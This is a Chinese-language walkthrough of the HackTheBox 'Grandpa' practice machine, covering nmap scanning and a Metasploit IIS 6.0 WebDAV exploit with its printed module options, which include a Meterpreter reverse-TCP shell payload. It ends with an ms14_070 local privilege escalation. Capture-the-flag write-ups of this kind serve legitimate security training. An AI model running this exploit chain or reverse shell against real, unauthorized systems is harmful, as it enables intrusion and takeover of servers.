---
title: Hackthebox::Grandpa walkthrough
date: 2021/12/14
categories: 渗透测试
tags: [渗透测试,walkthrough]
index_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_22.jpg
banner_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_22.jpg
---

- **Grandpa是hackthebox上一台难度为简单的windows靶机**

# 信息收集

- 首先使用nmap扫描一下端口情况

![image-20211227230552901](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227230552901.png)

- 然后使用nmap扫描一下是否存在漏洞

![image-20211227230757330](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227230757330.png)

- 通过两次nmap的扫描，我们得知靶机开放了80端口，并且存在漏洞
- 使用searchsploit扫描`Microsoft IIS httpd 6.0`服务，看看是否有可以被利用的漏洞

![image-20211227231051633](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227231051633.png)

- 我们发现了许多可以使用的脚本，再次使用msf查看是否可以利用‘

![image-20211227231247078](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227231247078.png)

- 我们发现了可以利用的部分，我们使用第二个

```shell
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.129.166.10    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```

- 我们成功进入了，但是很可惜我们的权限不足

![image-20211227231707825](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227231707825.png)

- 我们将迁移进程，并且寻找合适的漏洞利用脚本来入侵
- 迁移进程

![image-20211227231911796](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227231911796.png)

# 漏洞利用

- 使用suggester查看可以利用漏洞的脚本

![image-20211227232427257](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227232427257.png)

- 我们发现了以下可以使用的方式，我们选择`exploit/windows/local/ms14_070_tcpip_ioctl`

![image-20211227233022025](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227233022025.png)

- 完成设置

![image-20211227233230168](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227233230168.png)

- 好的，我们成功了，获得了最高权限

![image-20211227233425946](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227233425946.png)

- 查看flag

![image-20211227233646152](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227233646152.png)